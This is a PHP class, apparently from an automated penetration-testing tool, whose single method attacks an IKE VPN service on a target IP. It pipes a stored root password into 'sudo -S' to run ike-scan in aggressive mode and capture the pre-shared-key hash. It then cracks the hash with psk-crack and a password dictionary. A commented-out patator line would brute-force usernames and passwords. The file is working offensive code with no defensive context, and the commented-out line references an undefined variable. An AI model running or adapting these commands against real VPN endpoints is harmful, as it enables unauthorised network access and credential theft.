<?php


class service2vpn extends service2vnc {


    public function __construct($eth,$domain,$ip,$port,$service_protocol,$stream) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$stream);
    }


    
    public function service2vpn4exec(){
        $result = "";

            $result .= $this->ssTitre(__FUNCTION__);
            $query = "echo '$this->root_passwd' | sudo -S ike-scan -A -M  -P $this->dir_tmp/$this->ip.psk $this->ip";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            
            $query = "psk-crack -d $this->dico_password $this->dir_tmp/$this->ip.psk | grep matches ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            
            $query = "patator ike_enum host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
            //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
            return $result;
    }
    



  }
?>